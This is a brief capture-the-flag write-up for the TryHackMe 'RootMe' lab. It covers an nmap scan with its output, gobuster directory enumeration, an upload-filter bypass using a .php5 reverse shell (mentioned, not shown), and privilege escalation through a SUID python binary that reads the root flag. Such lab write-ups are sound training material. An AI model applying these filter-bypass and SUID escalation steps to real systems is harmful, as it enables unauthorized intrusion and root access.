https://tryhackme.com/r/room/rrootme

current ip 10.10.221.141

##### Nmap
`nmap -sV -A -p- 10.10.22.112`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 11:45 CEST
Nmap scan report for 10.10.22.112
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.25 seconds
```

##### Enumeration
`gobuster dir -u http://10.10.22.112 -w /usr/share/wordlists/dirbuster

Found /uploads and /panel interresting

##### The payload
Uploaded a php reverse shell using .php5 to bypass the filter (tried magic number too)
##### User flag is in /var/www

##### SUID check
`find / -perm /4000 2>/dev/null` found `/usr/bin/python` as binary executed as root
##### Privilege escalation
###### Using bash command execution
creating a script.py file in /tmp
```python
import subprocess

subprocess.call(["cat","/root/root.txt"])
```

